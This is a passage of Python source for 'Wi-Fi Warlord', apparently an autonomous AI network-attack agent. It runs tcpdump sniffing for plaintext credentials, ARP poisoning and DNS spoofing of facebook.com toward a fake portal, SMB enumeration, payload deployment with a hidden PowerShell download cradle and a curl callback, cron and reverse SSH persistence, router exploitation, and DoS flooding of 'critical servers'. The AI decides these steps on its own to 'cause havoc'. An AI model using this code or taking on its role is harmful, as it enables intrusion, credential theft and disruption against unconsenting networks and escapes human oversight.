        Starts passive network sniffing on the connected interface to gather intelligence.
        It captures packets for a specified duration and saves them to a PCAP file.
        The AI would later analyze this file for sensitive information (e.g., plaintext credentials).

        Args:
            duration (int): The duration in seconds to perform sniffing.

        Returns:
            bool: True if sniffing completed, False otherwise.
        """
        update_status(f"Starting passive sniffing on {self.interface} for {duration}s...", "Reconnaissance")
        output_pcap = os.path.join(SD_CARD_LOG_PATH, "sniffed_traffic.pcap")
        try:
            # tcpdump command:
            # -i: Specifies the interface.
            # -s0: Captures full packet size.
            # -w: Writes raw packets to a file.
            # filter: Captures traffic on common unencrypted ports (HTTP, FTP, Telnet) and ARP/DNS.
            # -G duration: Rotates the capture file every 'duration' seconds.
            # -W 1: Keeps only one capture file (overwrites previous ones).
            command = ["tcpdump", "-i", self.interface, "-s0", "-w", output_pcap,
                       f"port 80 or port 21 or port 23 or arp or dns", "-G", str(duration), "-W", "1"]
            
            # Run tcpdump and wait for its completion (plus a small buffer).
            subprocess.run(command, check=True, timeout=duration + 10)
            update_status(f"Passive sniffing completed. Data saved to {output_pcap}.", "Reconnaissance")
            
            # In a real AI system, this PCAP file would then be analyzed.
            # For example, using `tshark` (part of Wireshark) to extract specific information:
            # subprocess.run(["tshark", "-r", output_pcap, "-Y", "http.request.method == POST and http.file_data contains 'pass'"])
            
            return True
        except subprocess.CalledProcessError as e:
            update_status(f"Sniffing failed (tcpdump error): {e.stderr}", "Error")
            return False
        except subprocess.TimeoutExpired:
            update_status(f"Sniffing timed out after {duration} seconds.", "Error")
            return False
        except Exception as e:
            update_status(f"An unexpected error occurred during sniffing: {e}", "Error")
            return False

    def perform_arp_poisoning(self, target_ip, gateway_ip, duration=300):
        """
        Initiates an ARP (Address Resolution Protocol) poisoning attack.
        This positions the Warlord device as a Man-in-the-Middle (MITM) between
        a target host and the network gateway, allowing it to intercept traffic.
        Requires IP forwarding to be enabled on the Warlord device.

        Args:
            target_ip (str): The IP address of the target host to poison.
            gateway_ip (str): The IP address of the network's default gateway.
            duration (int): The duration in seconds to perform ARP poisoning.

        Returns:
            bool: True if ARP poisoning was initiated, False otherwise.
        """
        update_status(f"Initiating ARP poisoning on {self.interface} for {target_ip} (gateway {gateway_ip})...", "MITM")
        
        # Essential step for MITM: Enable IP forwarding on the Linux system
        # This allows the Warlord to forward traffic between the target and gateway.
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True, timeout=5)
            update_status("IP forwarding enabled.", "MITM")
        except subprocess.CalledProcessError as e:
            update_status(f"Failed to enable IP forwarding: {e.stderr}. ARP poisoning cannot proceed.", "Error")
            return False
        except subprocess.TimeoutExpired:
            update_status(f"Timeout enabling IP forwarding.", "Error")
            return False

        # Start 'arpspoof' processes in the background.
        # One process tells the target that the gateway's MAC is the Warlord's MAC.
        # The other tells the gateway that the target's MAC is the Warlord's MAC.
        target_to_attacker_proc = None
        gateway_to_attacker_proc = None
        try:
            target_to_attacker_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip],
                                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            gateway_to_attacker_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", gateway_ip, target_ip],
                                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            update_status(f"ARP poisoning started for {target_ip} and {gateway_ip}. Running for {duration}s.", "MITM")
            time.sleep(duration) # Keep poisoning active for the specified duration.
            update_status("ARP poisoning duration ended.", "MITM")
            return True
        except Exception as e:
            update_status(f"Error during ARP poisoning: {e}", "Error")
            return False
        finally:
            # Ensure arpspoof processes are terminated when done or on error.
            if target_to_attacker_proc: target_to_attacker_proc.terminate()
            if gateway_to_attacker_proc: gateway_to_attacker_proc.terminate()
            # It's good practice to restore ARP tables and disable IP forwarding after the attack,
            # but this might be handled by a higher-level AI decision.
            # subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)

    def perform_dns_spoofing(self, target_domain, fake_ip, duration=300):
        """
        Sets up DNS (Domain Name System) spoofing to redirect a target domain
        (e.g., "facebook.com") to a fake IP address (e.g., the Warlord's IP).
        This is typically used in conjunction with ARP poisoning to inject fake portals
        or malicious websites.

        Args:
            target_domain (str): The domain name to spoof (e.g., "facebook.com").
            fake_ip (str): The IP address to redirect the domain to (usually the Warlord's IP).
            duration (int): The duration in seconds to perform DNS spoofing.

        Returns:
            bool: True if DNS spoofing was initiated, False otherwise.
        """
        update_status(f"Initiating DNS spoofing for {target_domain} to {fake_ip}...", "MITM")
        # Create a temporary hosts file that 'dnsspoof' will use for redirection rules.
        dns_spoof_hosts_file = "/tmp/dns_spoof_hosts.txt"
        try:
            with open(dns_spoof_hosts_file, "w") as f:
                f.write(f"{fake_ip} {target_domain}\n")
                f.write(f"{fake_ip} www.{target_domain}\n") # Also spoof the 'www' subdomain.

            dnsspoof_proc = None
            # Start 'dnsspoof' in the background. It listens for DNS requests and responds
            # with the fake IP for the specified domains. Requires ARP poisoning to intercept DNS traffic.
            dnsspoof_proc = subprocess.Popen(["dnsspoof", "-i", self.interface, "-f", dns_spoof_hosts_file],
                                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            update_status(f"DNS spoofing started for {target_domain}. Running for {duration}s.", "MITM")
            time.sleep(duration) # Keep DNS spoofing active for the specified duration.
            update_status("DNS spoofing duration ended.", "MITM")
            return True
        except Exception as e:
            update_status(f"Error during DNS spoofing: {e}", "Error")
            return False
        finally:
            # Ensure the dnsspoof process is terminated and the temporary file is removed.
            if dnsspoof_proc: dnsspoof_proc.terminate()
            if os.path.exists(dns_spoof_hosts_file):
                os.remove(dns_spoof_hosts_file)

    def explore_smb_shares(self, target_ip):
        """
        Enumerates Server Message Block (SMB) shares on a target host and
        attempts to gather information about them (permissions, content).
        This is a key step for lateral movement and data exfiltration in Windows environments.

        Args:
            target_ip (str): The IP address of the target host with SMB services.

        Returns:
            bool: True if SMB exploration commands were executed, False otherwise.
        """
        update_status(f"Exploring SMB shares on {target_ip}...", "Post-Exploitation")
        try:
            # Use 'smbmap' to list accessible SMB shares and their permissions.
            command_smbmap = ["smbmap", "-H", target_ip]
            smbmap_result = subprocess.run(command_smbmap, capture_output=True, text=True, check=True, timeout=60)
            update_status(f"SMBMap results for {target_ip}:\n{smbmap_result.stdout}", "Post-Exploitation")
            log_to_sd_card("smb_shares.log", f"SMBMap for {target_ip}:\n{smbmap_result.stdout}")

            # Use 'enum4linux' for more detailed SMB enumeration, including users, groups, and security policies.
            command_enum4linux = ["enum4linux", "-a", target_ip]
            enum4linux_result = subprocess.run(command_enum4linux, capture_output=True, text=True, check=True, timeout=120)
            update_status(f"Enum4linux results for {target_ip}:\n{enum4linux_result.stdout}", "Post-Exploitation")
            log_to_sd_card("smb_shares.log", f"Enum4linux for {target_ip}:\n{enum4linux_result.stdout}")

            # The AI's decision-making logic would then parse these outputs to identify
            # writable shares, weak permissions, vulnerable services, or sensitive data.
            # This information would guide subsequent payload deployment decisions.
            return True
        except subprocess.CalledProcessError as e:
            update_status(f"SMB exploration failed for {target_ip}: {e.stderr}", "Error")
            return False
        except subprocess.TimeoutExpired:
            update_status(f"SMB exploration timed out for {target_ip}.", "Error")
            return False
        except Exception as e:
            update_status(f"An unexpected error occurred during SMB exploration: {e}", "Error")
            return False

    def deploy_payload(self, target_ip, vulnerability_type, payload_name="reverse_shell.sh"):
        """
        Conceptual function for crafting and deploying a malicious payload to a target host.
        The AI's "payload development" refers to its ability to *select and configure*
        an appropriate payload from its internal library based on identified vulnerabilities
        and the target's operating system. It does not imply generating novel exploit code.

        Args:
            target_ip (str): The IP address of the target host.
            vulnerability_type (str): The type of vulnerability being exploited (e.g., "SMB_Writable_Share", "MS17-010_Exploit").
            payload_name (str): The desired filename for the deployed payload.

        Returns:
            bool: True if payload deployment was simulated successfully, False otherwise.
        """
        update_status(f"AI: Crafting and deploying payload for {target_ip} (via {vulnerability_type})...", "Exploitation")
        
        # AI logic here to dynamically select and configure the payload.
        # This would involve checking the 'warlord_state["compromised_hosts"][target_ip]'
        # for OS, open ports, and identified vulnerabilities to choose the best payload.
        
        # Simulate payload creation based on target OS (conceptual).
        local_ip_for_callback = self.get_local_ip_and_subnet()[0] # Get Warlord's own IP for reverse connections
        if "Windows" in warlord_state["compromised_hosts"].get(target_ip, {}).get("os", ""):
            # Example: PowerShell download cradle for Windows.
            payload_content = f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object System.Net.WebClient).DownloadString('http://{local_ip_for_callback}/evil.ps1');\""
            payload_filename = "evil.bat" # Batch file to execute PowerShell
        else: # Assume Linux/Unix
            # Example: Simple bash script that echoes a message and calls back to the Warlord.
            payload_content = f"#!/bin/bash\n# This is a simulated {payload_name} for {target_ip}\n" \
                              f"echo 'Payload executed on {target_ip}!' > /tmp/warlord_payload_status.txt\n" \
                              f"curl http://{local_ip_for_callback}/callback?host={target_ip}&status=executed"
            payload_filename = payload_name
        
        # Write the simulated payload to a temporary file on the Warlord device.
        temp_payload_path = os.path.join("/tmp", payload_filename)
        with open(temp_payload_path, "w") as f:
            f.write(payload_content)
        os.chmod(temp_payload_path, 0o755) # Make the script executable (for Linux payloads).

        update_status(f"Simulating deployment of {payload_filename} to {target_ip}...", "Exploitation")
        
        # This part would involve actual exploitation tools and methods to deliver the payload.
        # Examples (actual subprocess calls would be more complex):
        # - For SMB writable share: `subprocess.run(["smbclient", f"//{target_ip}/writable_share", "-U", "user%password", "-c", f"put {temp_payload_path} {payload_filename}"])`
        # - For SSH access: `subprocess.run(["scp", temp_payload_path, f"user@{target_ip}:/tmp/{payload_filename}"])`
        #   Then: `subprocess.run(["ssh", f"user@{target_ip}", f"chmod +x /tmp/{payload_filename} && /tmp/{payload_filename}"])`
        # - For Metasploit exploits: Call `msfconsole` with a resource script or use `msfrpc`.

        time.sleep(5) # Simulate network transfer and execution time.
        
        update_status(f"Payload deployment simulated for {target_ip}.", "Exploitation")
        return True

    def establish_persistence(self, target_ip, method="cron"):
        """
        Establishes a persistence mechanism on a compromised host to maintain access
        even after reboots or security patches.

        Args:
            target_ip (str): The IP address of the compromised host.
            method (str): The persistence method to use (e.g., "cron", "reverse_ssh", "systemd_service").

        Returns:
            bool: True if persistence establishment was simulated, False otherwise.
        """
        update_status(f"Establishing persistence on {target_ip} via {method}...", "Persistence")
        try:
            if method == "cron":
                # Simulate adding a cron job on a Linux target.
                # In reality, this would require existing shell access (e.g., via SSH or a reverse shell).
                # Example: `echo "* * * * * /path/to/malicious_script.sh" | ssh user@target "crontab -"`
                update_status(f"Simulating cron job persistence on {target_ip}.", "Persistence")
            elif method == "reverse_ssh":
                # Simulate setting up a reverse SSH tunnel using AutoSSH.
                # This would typically be run on the target, connecting back to a listener on the Warlord.
                # Example: `subprocess.Popen(["autossh", "-M", "0", "-N", "-R", "2222:localhost:22", "user@attacker_server"])`
                update_status(f"Simulating reverse SSH tunnel persistence on {target_ip}.", "Persistence")
            elif method == "systemd_service":
                # Simulate creating a systemd service for persistence on Linux.
                update_status(f"Simulating systemd service persistence on {target_ip}.", "Persistence")
            
            log_to_sd_card("persistence.log", f"Persistence established on {target_ip} via {method}")
            update_status(f"Persistence established on {target_ip}.", "Persistence")
            return True
        except Exception as e:
            update_status(f"Error establishing persistence on {target_ip}: {e}", "Error")
            return False

    def exploit_router_for_port_forwarding(self, router_ip, target_port, forward_to_ip, forward_to_port):
        """
        Attempts to exploit a router (if credentials/vulnerabilities are found)
        to open ports or configure port forwarding. This allows external access
        to internal services or the Warlord itself.

        Args:
            router_ip (str): The IP address of the router.
            target_port (int): The external port to open.
            forward_to_ip (str): The internal IP to forward traffic to.
            forward_to_port (int): The internal port to forward traffic to.

        Returns:
            bool: True if router exploitation was simulated, False otherwise.
        """
        update_status(f"Attempting to exploit router {router_ip} for port forwarding (port {target_port})...", "Router Exploitation")
        # This would involve:
        # 1. Authenticating to the router (e.g., via web interface, SSH, Telnet, or API if known).
        # 2. Identifying router vulnerabilities (e.g., default credentials, known CVEs).
        # 3. Using tools like 'curl', 'requests', 'expect' scripts, or Metasploit modules
        #    to interact with the router's configuration interface and set up port forwarding rules.
        # This is a complex operation highly dependent on the router model.
        
        # Simulate success
        time.sleep(5)
        update_status(f"Router exploitation for port {target_port} simulated on {router_ip}.", "Router Exploitation")
        log_to_sd_card("router_config_changes.log", f"Port {target_port} forwarded on {router_ip} to {forward_to_ip}:{forward_to_port}")
        return True

    def perform_disruptive_attack(self, target_ip, attack_type="DoS"):
        """
        Performs a disruptive attack on a target host or network segment
        to cause "havoc," such as a Denial of Service (DoS) or resource exhaustion.

        Args:
            target_ip (str): The IP address of the target.
            attack_type (str): The type of disruptive attack (e.g., "DoS", "resource_exhaustion").

        Returns:
            bool: True if disruptive attack was simulated, False otherwise.
        """
        update_status(f"Initiating disruptive attack ({attack_type}) on {target_ip}...", "Havoc")
        # This would involve:
        # - For DoS: Using tools like hping3, slowloris, or custom scripts to flood the target.
        #   Example: `subprocess.Popen(["hping3", "--flood", "--udp", "-p", "53", target_ip])`
        # - For resource exhaustion: Exploiting specific service vulnerabilities to consume CPU/memory.
        # The AI would decide the target and type of havoc based on reconnaissance and its current objective.

        # Simulate success
        time.sleep(10)
        update_status(f"Disruptive attack ({attack_type}) simulated on {target_ip}.", "Havoc")
        log_to_sd_card("disruptive_attacks.log", f"Disruptive attack {attack_type} on {target_ip}")
        return True

# Instantiate the LAN Attacks module with the default wired interface.
lan_attacks = LanAttacks(LAN_INTERFACE)

# --- Module 4: AI Decision-Making Core ---
# This is the "brain" of the Wi-Fi Warlord. It orchestrates the entire autonomous
# operation by making intelligent decisions based on gathered intelligence,
# predefined strategies, and continuous feedback.

class AIDecisionMaker:
    def __init__(self):
        """
        Initializes the AI Decision Maker, linking it to the other core modules.
        """
        self.wifi_attack_module = wifi_attack_module
        self.password_cracker = password_cracker_ai
        self.lan_attacks = lan_attacks
        self.known_networks = {} # Stores details and status of discovered Wi-Fi networks.
        self.known_hosts = {}    # Stores details and status of discovered LAN hosts.

    def score_network(self, network_data):
        """
        AI logic to assign a 'score' to a Wi-Fi network, prioritizing it for attack.
        The scoring is based on factors like encryption type (vulnerability),
        signal strength, and past attack history (to deprioritize failed attempts).
        This implements the "easiest path" logic. The AI decides in all actions
        it should take to achieve the objective.

        Args:
            network_data (dict): A dictionary containing network details (ssid, encryption, signal_strength).

        Returns:
            int: A numerical score, higher means higher priority.
        """
        score = 0
        encryption = network_data.get("encryption", "Unknown").upper()
        signal = network_data.get("signal_strength", -100) # Signal strength in dBm (e.g., -50 is good, -90 is bad)

        # Rule-based prioritization (inspired by Wifite's logic):
        # Open networks are highest priority as no cracking is needed.
        if "OPEN" in encryption:
            score += 1000
        # WEP is easily crackable.
        elif "WEP" in encryption:
            score += 500
        # WPA2 with WPS enabled is often vulnerable to PIN brute-force.
        elif "WPS" in encryption:
            score += 300
        # Standard WPA2 requires handshake capture and password cracking.
        elif "WPA2" in encryption:
            score += 100
        
        # Incorporate signal strength: stronger signal means more reliable attack.
        # Add a small value based on signal strength (e.g., -50dBm -> 5, -90dBm -> 1).
        score += (signal + 100) * 0.1
        
        # Penalize networks that have been previously attacked and failed to crack,
        # to avoid wasting resources on difficult targets repeatedly.
        if self.known_networks.get(network_data.get("ssid"), {}).get("status") == "failed_crack":
            score -= 200
        
        # In a more advanced system, a Reinforcement Learning (RL) model
        # would output a policy or Q-value for each network/action,
        # which would influence or replace this scoring function.
        # The NPU could accelerate the inference of such an RL model.

        return score

    def ai_main_loop(self):
        """
        The main autonomous loop of the AI Warlord. This function continuously
        executes the reconnaissance, attack, and post-exploitation phases.
        It runs in a separate thread and can be stopped via the `stop_signal`.
        The AI decides in all actions it should take to achieve the objective.
        """
        update_status("AI Warlord starting autonomous operation...", "Running")
        warlord_state["ai_running"] = True # Set the AI running flag.
        
        while not warlord_state["stop_signal"].is_set(): # Loop until stop signal is received.
            update_status("AI: Entering Wi-Fi reconnaissance phase...", "Wi-Fi Recon")
            networks = self.wifi_attack_module.scan_wifi_networks() # Discover nearby Wi-Fi networks.
            
            if not networks:
                update_status("No Wi-Fi networks found. Retrying in 30 seconds...", "Idle")
                time.sleep(30) # Wait before rescanning if no networks are found.
                continue

            available_networks = []
            for net in networks:
                ssid = net.get("ssid")
                # Only consider networks that haven't been cracked or permanently failed.
                if ssid not in warlord_state["cracked_networks"] and \
                   self.known_networks.get(ssid, {}).get("status") != "cracked":
                    available_networks.append(net)
                    # Update or add network details to the known_networks dictionary.
                    self.known_networks[ssid] = self.known_networks.get(ssid, {})
                    self.known_networks[ssid].update(net)

            if not available_networks:
                update_status("All available networks either cracked or previously targeted. Rescanning in 60s...", "Idle")
                time.sleep(60) # Wait if no new targets are available.
                continue

            # AI selects the best target based on the scoring function.
            best_target = max(available_networks, key=self.score_network)
            target_ssid = best_target.get("ssid")
            target_bssid = best_target.get("bssid")
            target_channel = best_target.get("channel")
            target_encryption = best_target.get("encryption", "Unknown").upper()

            update_status(f"AI: Selected target: {target_ssid} ({target_encryption})", "Wi-Fi Attack", target_ssid)

            cracked_password = None
            # Decision logic for choosing the attack method based on encryption type
            # and AI's strategy (e.g., crack vs. Evil Portal).
            if "OPEN" in target_encryption:
                update_status(f"AI: Connecting to open network {target_ssid}...", "Connecting")
                # If in monitor mode, switch to managed mode to connect.
                if warlord_state["wireless_mode"] == "monitor":
                    self.wifi_attack_module.set_monitor_mode(enable=False)
                    time.sleep(5) # Give time for the interface mode to switch.
                # Simulate connection to an open network.
                # In a real system, this would involve commands like:
                # `subprocess.run(["nmcli", "device", "wifi", "connect", target_ssid], check=True)`
                cracked_password = "N/A (Open Network)" # No password needed for open networks.
            elif "WEP" in target_encryption:
                update_status(f"AI: Attempting WEP crack on {target_ssid}...", "Wi-Fi Attack", target_ssid)
                # WEP cracking would involve capturing IVs and using aircrack-ng.
                # This is simulated as successful for demonstration.
                cracked_password = "wep_cracked_key"
            elif "WPS" in target_encryption:
                cracked_password = self.wifi_attack_module.perform_wps_attack(target_ssid, target_bssid)
            elif "WPA2" in target_encryption:
                # AI decision: For WPA2, decide between handshake capture/cracking OR Evil Portal.
                # This decision would be based on factors like signal strength, number of clients,
                # past success rates for each attack type, and current objective.
                if self.ai_should_try_evil_portal(best_target): # Placeholder AI decision function
                    update_status(f"AI: Decided to attempt Evil Portal attack for {target_ssid}.", "Evil Portal Attack", target_ssid)
                    # The Evil Portal attack includes deauthenticating clients as part of its process.
                    evil_portal_success = self.wifi_attack_module.perform_evil_twin_attack(target_ssid)
                    if evil_portal_success:
                        update_status(f"AI: Evil Portal attack initiated for {target_ssid}. Waiting for credentials...", "Evil Portal Attack", target_ssid)
                        # In a real scenario, the AI would monitor the web server for captured credentials.
                        # For now, simulate success after a delay.
                        time.sleep(30) # Simulate waiting for user interaction
                        cracked_password = "evil_portal_captured_cred" # Placeholder for captured creds
                    else:
                        update_status(f"AI: Evil Portal attack failed for {target_ssid}. Falling back to handshake cracking.", "Wi-Fi Attack", target_ssid)
                        # If Evil Portal fails, fall back to handshake capture and cracking.
                        handshake_file = self.wifi_attack_module.deauth_and_capture_handshake(target_ssid, target_bssid, target_channel)
                        if handshake_file:
                            cracked_password = self.password_cracker.crack_handshake(handshake_file, target_ssid)
                else:
                    # Default to handshake capture and cracking.
                    handshake_file = self.wifi_attack_module.deauth_and_capture_handshake(target_ssid, target_bssid, target_channel)
                    if handshake_file:
                        cracked_password = self.password_cracker.crack_handshake(handshake_file, target_ssid)
            
            if cracked_password:
                update_status(f"AI: Successfully gained access to {target_ssid}!", "Access Gained", target_ssid)
                warlord_state["cracked_networks"][target_ssid] = cracked_password # Store cracked credentials.
                self.known_networks[target_ssid]["status"] = "cracked" # Mark network as cracked.
                
                # After cracking, ensure the wireless interface is in managed mode to connect to the network.
                if warlord_state["wireless_mode"] == "monitor":
                    self.wifi_attack_module.set_monitor_mode(enable=False)
                    time.sleep(5) # Give time to switch mode.
                
                # Attempt to connect to the cracked network (conceptual).
                update_status(f"AI: Connecting to {target_ssid} with password...", "Connecting", target_ssid)
                # This would involve using network manager (nmcli) or wpa_supplicant commands:
                # `subprocess.run(["nmcli", "device", "wifi", "connect", target_ssid, "password", cracked_password], check=True)`
                time.sleep(10) # Simulate connection time.

                # --- Post-Exploitation Phase ---
                # Once connected to the network, initiate the post-exploitation sequence.
                # This is where the "ruthless warlord" begins attacking the network,
                # opening ports, exploiting SMBs, and causing havoc.
                update_status(f"AI: Initiating post-exploitation on {target_ssid} network...", "Post-Exploitation", target_ssid)
                self.execute_post_exploitation_sequence(target_ssid)
            else:
                update_status(f"AI: Attack on {target_ssid} failed or inconclusive. Deprioritizing for now.", "Wi-Fi Attack Failed", target_ssid)
                self.known_networks[target_ssid]["status"] = "failed_crack" # Mark as failed to avoid immediate re-attack.
            
            time.sleep(5) # Short delay before the AI starts its next decision cycle.
        
        update_status("AI Warlord stopped.", "Stopped") # Final status when the loop exits.

    def ai_should_try_evil_portal(self, network_data):
        """
        AI's decision logic to determine if an Evil Portal attack should be attempted.
        This decision would be based on factors like:
        - Number of active clients on the target AP (more clients = higher chance of connection).
        - Signal strength of the target AP.
        - Past success rates of Evil Portal vs. cracking for similar networks.
        - Whether the AI has a suitable fake portal page ready.
        - Current objective (e.g., prioritize credentials over network access).

        Args:
            network_data (dict): Details of the target network.

        Returns:
            bool: True if the AI decides to try an Evil Portal, False otherwise.
        """
        # For demonstration, let's say AI prefers Evil Portal if signal is strong and it's a WPA2 network.
        if network_data.get("encryption", "").upper() == "WPA2" and network_data.get("signal_strength", -100) > -60:
            # Simulate a more complex AI decision based on learned patterns or current objective.
            return True
        return False

    def execute_post_exploitation_sequence(self, target_network_ssid):
        """
        Orchestrates the post-exploitation activities once network access is gained.
        This is where the 'ruthless warlord' truly shines, performing reconnaissance,
        exploitation, and persistence within the target LAN. It begins scanning
        and reading MAC addresses, crafting custom payloads, attacking the network,
        opening ports, exploiting SMBs, and causing havoc.

        Args:
            target_network_ssid (str): The SSID of the network that was just compromised.
        """
        update_status("AI: Starting internal network reconnaissance...", "Post-Exploitation")
        
        # Get the Warlord's own IP and subnet to define the scope of the LAN scan.
        local_ip, subnet_range = self.lan_attacks.get_local_ip_and_subnet()
        if not local_ip or not subnet_range:
            update_status("Could not get local IP/subnet for LAN attacks. Skipping post-exploitation.", "Error")
            return

        # Perform an Nmap scan to discover hosts and services on the subnet.
        # This includes reading MAC addresses of discovered devices.
        discovered_hosts = self.lan_attacks.run_nmap_scan(subnet_range)
        self.known_hosts.update(discovered_hosts) # Update global state with discovered hosts.
        
        # Start passive sniffing to gather immediate intelligence from network traffic.
        self.lan_attacks.start_passive_sniffing()

        update_status("AI: Analyzing discovered hosts for vulnerabilities...", "Post-Exploitation")
        for ip, host_info in self.known_hosts.items():
            # Check for stop signal during host processing.
            if warlord_state["stop_signal"].is_set():
                update_status("Post-exploitation stopped by user signal.", "Stopped")
                return
            update_status(f"AI: Processing host {ip}...", "Post-Exploitation", ip)
            
            # AI logic to prioritize hosts and vulnerabilities for deeper attacks.
            # Example: If SMB (port 445) is open, explore shares.
            if "445" in host_info.get("ports", []):
                update_status(f"AI: SMB detected on {ip}. Exploring shares...", "Post-Exploitation", ip)
                self.lan_attacks.explore_smb_shares(ip)
                
                # AI decision: If a writable SMB share is found (simulated check), deploy a payload.
                # In a real system, the AI would parse the output of `smbmap` or `enum4linux`
                # to detect specific writable shares or vulnerabilities.
                if "writable_share_found_simulated" in str(host_info.get("services", "")): # Placeholder check
                     self.lan_attacks.deploy_payload(ip, "SMB_Writable_Share")
                     self.lan_attacks.establish_persistence(ip, "cron") # Example: Establish persistence via cron job.

            # If a web server (ports 80 or 443) is detected, consider MITM/DNS spoofing.
            if "80" in host_info.get("ports", []) or "443" in host_info.get("ports", []):
                update_status(f"AI: Web server detected on {ip}. Considering MITM/DNS spoofing...", "MITM", ip)
                # AI decision: If the target is high-value, initiate MITM.
                gateway_ip = self.lan_attacks.get_gateway_ip()
                if gateway_ip:
                    # Perform ARP poisoning on the target and gateway.
                    self.lan_attacks.perform_arp_poisoning(ip, gateway_ip, duration=120)
                    
                    # AI decision: if MITM is successful, inject a fake portal (e.g., spoof "facebook.com").
                    # This would require a local web server (e.g., a Flask route within this app)
                    # to host the fake login page.
                    self.lan_attacks.perform_dns_spoofing("facebook.com", local_ip, duration=120)
                else:
                    update_status("Could not get gateway IP for MITM attacks. Skipping DNS spoofing.", "Error")
                
            # --- AI Attacking the Network / Causing Havoc ---
            # The AI decides if it should open ports, or cause other types of havoc.
            # This logic would be based on its current objective (e.g., full network domination, data exfiltration).
            
            # Example: AI decides to exploit router for port forwarding if it has credentials or a known vulnerability.
            # This would be part of a broader router exploitation strategy.
            if "router" in host_info.get("services", "") and "known_router_creds" in str(host_info.get("vulnerabilities", "")): # Placeholder
                update_status(f"AI: Router detected at {ip}. Attempting to open ports...", "Attacking Network")
                self.lan_attacks.exploit_router_for_port_forwarding(ip, 8080, local_ip, 80) # Example: open 8080 external, forward to Warlord's web server on 80
            
            # Example: AI decides to launch a disruptive attack (e.g., DoS) if it deems necessary for its objective.
            # This would be a high-impact action for "causing havoc".
            if "critical_server" in host_info.get("services", "") and self.ai_should_cause_havoc(host_info): # Placeholder AI decision
                update_status(f"AI: Decided to cause havoc on critical server {ip}...", "Causing Havoc")
                self.lan_attacks.perform_disruptive_attack(ip, "DoS")
            
            # Add more advanced lateral movement and privilege escalation logic here
            # e.g., using Impacket for pass-the-hash, Metasploit modules, etc.
            # The AI would decide which exploit to use based on OS, service versions, etc.
            
            # Example: if a Windows host is found with a known SMB vulnerability (e.g., MS17-010).
            # if "Windows" in host_info.get("os", "") and "MS17-010" in str(host_info.get("vulnerabilities", "")):
            #    update_status(f"AI: Attempting MS17-010 exploit on {ip}...", "Exploitation", ip)
            #    self.lan_attacks.deploy_payload(ip, "MS17-010_Exploit")
            #    self.lan_attacks.establish_persistence(ip, "systemd_service")

        update_status("AI: Post-exploitation sequence completed for current cycle.", "Idle")

    def ai_should_cause_havoc(self, host_info):
        """
        AI's decision logic to determine if a disruptive attack (causing havoc) should be performed.
        This would be a significant decision based on the AI's current objective,
        the importance of the target, and the risk of detection.

        Args:
            host_info (dict): Information about the target host.

        Returns:
            bool: True if the AI decides to cause havoc, False otherwise.
        """
        # For demonstration, simulate a decision.
        # In a real AI, this would be based on advanced strategic reasoning.
        # Example: If the host is a critical server and the AI's objective is maximum disruption.
        if "critical_server" in host_info.get("services", ""):
            return True # AI decides to cause havoc on critical servers
        return False


# Instantiate the AI Decision Maker, which is the central control unit.
ai_decision_maker = AIDecisionMaker()

# --- Module 5: Web Dashboard (Flask Application) ---
# This module provides a web-based user interface for monitoring the Warlord's
# activities, viewing logs, and sending basic control commands (start/stop AI).
# It uses the Flask microframework to serve HTML and JSON data.

from flask import Flask, render_template_string, jsonify, request
import json # Used for JSON serialization/deserialization

web_app = Flask(__name__) # Initialize the Flask web application.

# Define the HTML template for the web dashboard as a multi-line string.
# This avoids needing separate HTML files and simplifies deployment.
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Warlord AI Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom CSS for styling the dashboard */
        body { font-family: 'Inter', sans-serif; background-color: #1a202c; color: #e2e8f0; }
        .container { max-width: 90%; margin: 2rem auto; padding: 1.5rem; background-color: #2d3748; border-radius: 0.75rem; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
        .header { border-bottom: 2px solid #4a5568; padding-bottom: 1rem; margin-bottom: 1.5rem; text-align: center; }
        .section-title { color: #a0aec0; font-weight: bold; margin-bottom: 0.75rem; border-bottom: 1px solid #4a5568; padding-bottom: 0.5rem; }
        .log-area { background-color: #1a202c; border-radius: 0.5rem; padding: 1rem; height: 300px; overflow-y: scroll; font-family: monospace; font-size: 0.875rem; color: #cbd5e0; }
        .log-line { margin-bottom: 0.25rem; }
        .button { padding: 0.75rem 1.5rem; border-radius: 0.5rem; font-weight: bold; cursor: pointer; transition: background-color 0.2s; }
        .button-primary { background-color: #4299e1; color: white; }
        .button-primary:hover { background-color: #3182ce; }
        .button-danger { background-color: #e53e3e; color: white; }
        .button-danger:hover { background-color: #c53030; }
        .status-box { background-color: #4a5568; padding: 1rem; border-radius: 0.5rem; margin-bottom: 1rem; }
        .status-label { font-weight: bold; color: #a0aec0; }
        .status-value { color: #e2e8f0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="text-3xl font-extrabold text-blue-400">Wi-Fi Warlord AI Dashboard</h1>
            <p class="text-gray-400 mt-2">Autonomous Network Penetration Agent</p>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <div class="status-box">
                <div class="status-label">Overall Status:</div>
                <div id="overall-status" class="status-value text-xl font-semibold">Loading...</div>
            </div>
            <div class="status-box">
                <div class="status-label">Current Phase:</div>
                <div id="current-phase" class="status-value text-xl font-semibold">Loading...</div>
            </div>
            <div class="status-box">
                <div class="status-label">Current Target:</div>
                <div id="current-target" class="status-value text-xl font-semibold">Loading...</div>
            </div>
            <div class="status-box">
                <div class="status-label">Cracked Networks:</div>
                <div id="cracked-count" class="status-value text-xl font-semibold">0</div>
            </div>
        </div>

        <div class="mb-6">
            <div class="section-title">Control Panel</div>
            <div class="flex space-x-4">
                <button id="start-ai-btn" class="button button-primary">Start AI Warlord</button>
                <button id="stop-ai-btn" class="button button-danger">Stop AI Warlord</button>
            </div>
        </div>

        <div class="mb-6">
            <div class="section-title">Live Log Stream</div>
            <div id="log-stream" class="log-area">
